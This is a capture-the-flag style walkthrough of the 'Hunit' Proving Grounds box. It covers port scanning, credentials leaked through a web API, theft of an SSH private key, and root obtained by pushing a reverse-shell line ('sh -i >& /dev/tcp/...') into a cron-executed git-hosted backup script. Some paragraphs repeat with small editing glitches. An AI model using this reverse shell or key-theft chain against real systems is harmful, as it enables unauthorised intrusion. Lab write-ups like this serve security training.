---
Alias: Hunit
Date: 6/1/2022
Platform: Linux
Difficulty: Intermediate
Tags: #GitShell #CronTabScriptPrivilegeEscalation
Status: Finished
IP: 192.168.127.125
---

# {{Hunit}}


# Resolution summary
- Found a directory mentioned in the source code of the webpage
- The directory displayed the SSH users credentials.
- Discovered a cron job (backups.sh) that executes every three minutes
- In the SSH session, a git-server directory was located.
- We were able to examine the backup.sh script after git cloning the git server into the tmp directory. 
- Identified the user git and discovered that the ssh private key id_rsa file is readable and executable by the user git.
- After logging in as user git, I discovered an ssh private key and discovered it was a git-shell.
- Git cloned the server onto kali machine
- Made modifications to the backup.sh file and added a reverse shell.sh file
- Setup a netcat listener prior pushing the changes to the master branch
- Pushed the changes. As the cronjob/backup.sh script would run every 3 minutes I waited and received a shell as root
  
## Improved skills
- Finding hidden directories in the source code of web pages
- Cloning a Git server to Kali, edit files, and push updates
- Git-shell commands
- Modifying cron jobs

## Used tools
- Linpeas
- Rustscan
---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.189.125 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.189.125:8080
Open 192.168.189.125:12445
Open 192.168.189.125:18030
Open 192.168.189.125:43022
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.189.125
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 12:11 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:11
Completed Parallel DNS resolution of 1 host. at 12:11, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:11
Scanning 192.168.189.125 [4 ports]
Discovered open port 8080/tcp on 192.168.189.125
Discovered open port 12445/tcp on 192.168.189.125
Discovered open port 43022/tcp on 192.168.189.125
Discovered open port 18030/tcp on 192.168.189.125
Completed Connect Scan at 12:12, 60.09s elapsed (4 total ports)
Initiating Service scan at 12:12
Scanning 4 services on 192.168.189.125
Service scan Timing: About 50.00% done; ETC: 12:14 (0:01:13 remaining)
Completed Service scan at 12:13, 83.93s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.189.125.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 12.89s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.51s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
Nmap scan report for 192.168.189.125
Host is up, received user-set (0.079s latency).
Scanned at 2023-06-07 12:11:29 PDT for 143s

PORT      STATE SERVICE     REASON  VERSION
8080/tcp  open  http-proxy  syn-ack
|_http-title: My Haikus
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Wed, 07 Jun 2023 19:12:21 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 07 Jun 2023 19:12:21 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Wed, 07 Jun 2023 19:12:21 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
12445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
18030/tcp open  http        syn-ack Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix)
43022/tcp open  ssh         syn-ack OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7bfc37b4da6ec58ea98bb780f5cd09cb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdtyB+UZiCMunw9Cjpg1M5yda6gJvY9DgsuFuuTfMwpe1gRp6xnQparU4u+5h+KPkCvG1h2WCj9skJ4guDNY7KgidPsfxrbKBxE0815hkntRU+xZVZneSvX20yxSU8JGZgFJPSfTaTRiRvXgDY1ljJ4c+wq9QiAg0mpXyJzHLsJGZ9z9V+5Mm4+EC8yF3xla+TAFVZtykbTFSWjf/1nZS0famFh/TMSJ333s630q6VqLKBwJ0mc75Ui6Hk+9VlGNI29NejkQufCeYSebgGZHqIT+fcjjHIZWLJIBL/KIArcgHBTUbeXKBrEoNFsA+fFGewHYNxt7Ux+w7kYF0bEAel/TcwUN4b0ZbDY1iC/dPyfWk/gXtsnaQe8oYC+JkUZwz8wSgNhWecmJjS9P/C983M7IoyRaWR9yRqEN+h/yR10heEoAD/UOW6LnpoJNQQenev2B+z9XlW0rXUB8yLUZNiJm59bjJhYMTvEZLLaeoCd1IXbtfPfjWp7EO+3zfs2xc=
|   256 89cdea4725d98ff894c3d65cd405bad0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL68h2Z2xFUEzj7sURecPLgl8HJIdhZlhl0fOycHpBBiStKmKVTpDVLoOMPCspSWGHO2APE0Pd+dloHVc6lfVCc=
|   256 c07c6f477e94cc8bf83da0a61fa92711 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJWx+j72EVaL4qf6GJyePnJCG+SbfHaHB3st9je9n8oR
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=6/7%Time=6480D695%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,F51,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=UTF-8\r\nContent-Language:\x20en-US\r\nContent-Length:\x203762\r
SF:\nDate:\x20Wed,\x2007\x20Jun\x202023\x2019:12:21\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20HTML>\n<!--\n\tMinimaxing\x20by\x20HTML5\x
SF:20UP\n\thtml5up\.net\x20\|\x20@ajlkn\n\tFree\x20for\x20personal\x20and\
SF:x20commercial\x20use\x20under\x20the\x20CCA\x203\.0\x20license\x20\(htm
SF:l5up\.net/license\)\n-->\n<html>\n\t<head>\n\t\t<title>My\x20Haikus</ti
SF:tle>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,\x20initial-scale=1,\x20user-scalab
SF:le=no\"\x20/>\n\t\t<link\x20rel=\"stylesheet\"\x20href=\"/css/main\.css
SF:\"\x20/>\n\t</head>\n\t<body>\n\t\t<div\x20id=\"page-wrapper\">\n\n\t\t
SF:\t<!--\x20Header\x20-->\n\t\t\t\n\t\t\t\t<div\x20id=\"header-wrapper\">
SF:\n\t\t\t\t\t<div\x20class=\"container\">\n\t\t\t\t\t\t<div\x20class=\"r
SF:ow\">\n\t\t\t\t\t\t\t<div\x20class=\"col-12\">\n\n\t\t\t\t\t\t\t\t<head
SF:er\x20id=\"header\">\n\t\t\t\t\t\t\t\t\t<h1><a\x20href=\"/\"\x20id=\"lo
SF:go\">My\x20Haikus</a></h1>\n\t\t\t\t\t\t\t\t</header>\n\n\t\t\t\t\t\t\t
SF:</div>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t\t\
SF:n\n\t\t\t\n\t\t\t\t<div\x20id=\"main\">\n\t\t\t\t\t<div\x20clas")%r(HTT
SF:POptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nCont
SF:ent-Length:\x200\r\nDate:\x20Wed,\x2007\x20Jun\x202023\x2019:12:21\x20G
SF:MT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,259,"HTTP/1\.1\x2050
SF:5\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\
SF:x20en\r\nContent-Length:\x20465\r\nDate:\x20Wed,\x2007\x20Jun\x202023\x
SF:2019:12:21\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><
SF:title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x
SF:20Supported</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP
SF:\x20Version\x20Not\x20Supported</h1></body></html>");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:13
Completed NSE at 12:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.86 seconds

```

Enumerated open TCP ports:
```bash
8080
43022
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080  

- We open a web browser, navigate to http://192.168.143.125:8080, locate the webpage below, and click on "the taste of rain" link. Next, we right click and view page source. Afterwards, we can see that it includes the directory "/api".

![](Images/Pasted%20image%2020221016220003.png)
![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/11cd703c-4069-4be3-af3d-85fd284f472a)

![](Images/Pasted%20image%2020221017173943.png)

- After navigating to the "/api" directory and selecting "Raw Data" we locate a "/user" directory.
  
![](Images/Pasted%20image%2020221017174047.png)

![](Images/Pasted%20image%2020221017174142.png)

- We find the user login "dademola" and password "ExplainSlowQuest110" when we navigate to the directory "/user".
  
![](Images/Pasted%20image%2020221017174304.png)



#### -As port 43022 was found earlier running on SSH I typed the following to login to ssh session with the found credentials above "ssh –p 43022 dademola@192.168.143.125" with password "ExplainSlowQuest110" and received shell:

![](Images/Pasted%20image%2020221017174428.png)

---

# Privilege Escalation
## Local Enumeration

To escalate our privileges, we performed local enumeration using the Linpeas tool. During the scan, we discovered a cronjob named “crontab.bak” running as root. Upon examining “crontab.bak”, we found references to two files: “pull.sh” and “backups.sh”. The cronjob executed “pull.sh” every 2 minutes and “backups.sh” every 3 minutes.

![](Images/Pasted%20image%2020221017175014.png)
![](Images/Pasted%20image%2020221017175126.png)

To escalate our privileges, we performed local enumeration using the Linpeas tool. During the scan, we discovered a cronjob named “crontab.bak” running as root. Upon examining “crontab.bak”, we found references to two files: “pull.sh” and “backups.sh”. The cronjob executed “pull.sh” every 2 minutes and “backups.sh” every 3 minutes.tory:

![](Images/Pasted%20image%2020221017175529.png)

![](Images/Pasted%20image%2020221017175722.png)

After cloning the git server, we accessed the “backups.sh” file. Upon inspection, we realized it was a placeholder file. To gain control over the script, we set up our git identity by configuring the user.name and user.email using the commands git config — global user.name “dademola” and git config — global user.email “dademola@hunit.(none)”, respectively.

![](Images/Pasted%20image%2020221017180046.png)

![](Images/Pasted%20image%2020221017180308.png)

To escalate our privileges further, we injected a test instruction into the "backups.sh" file using the command echo "touch /tmp/gitscript-test" >> backups.sh. Additionally, we made the script executable by running chmod +x backups.sh. However, when attempting to push the modified file back to the git server, we encountered an error due to file ownership restrictions.

![](Images/Pasted%20image%2020221017180606.png)

### Lateral Movement
## Found private ssh key for user in SSH session

To proceed, we discovered a user named "git" and realized that we had read and execute permissions on the "id_rsa" SSH private key file belonging to the "git" user. To access the file from our Kali Linux machine, we used the command scp -P 43022 dademola@192.168.93.125:/home/git/.ssh/id_rsa . to download the private key. We then adjusted the permissions using chmod 600 to ensure proper security.

![](Images/Pasted%20image%2020221017180818.png)

![](Images/Pasted%20image%2020221017180904.png)

![](Images/Pasted%20image%2020221017185135.png)

Using the acquired private SSH key, we established an SSH connection to the target machine as the "git" user with the command ssh -i id_rsa -p 43022 git@192.168.93.125. This login provides access to the git-shell environment.

![](Images/Pasted%20image%2020221017185623.png)
#GitShell

- We should be able to communicate with the git repository as this is a git shell.

## Privilege Escalation vector
## Git-shell cron tab

To elevate privileges to root, we cloned the git server onto our Kali machine using GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.93.125:/git-server. Navigating into the cloned repository, we modified the "backups.sh" file by injecting a reverse shell command using echo "sh -i >& /dev/tcp/[kali IP]/8080 0>&1" >> backups.sh. After committing the changes using git add -A and git commit -m "pwn", we pushed the modified file to the git server using GIT_SSH_COMMAND='ssh -i /home/kali/Downloads/ProvingGroundsBoxes/Hunit/id_rsa -p 43022' git push origin master.

![](Images/Pasted%20image%2020221017191609.png)

![](Images/Pasted%20image%2020221017203812.png)

![](Images/Pasted%20image%2020221017204016.png)
![](Images/Pasted%20image%2020221017204123.png)

![](Images/Pasted%20image%2020221017204550.png)

We then started a Netcat listener on our Kali machine to receive the reverse shell. As the cronjob executed the "backups.sh" file every 3 minutes, we patiently waited for the reverse shell to trigger. Finally, after a few minutes, we gained a root shell on our Netcat listener, giving us complete control over the target machine.

![](Images/Pasted%20image%2020221017204827.png)
#Git-serverCronTabScriptPrivilegeEscalation

---

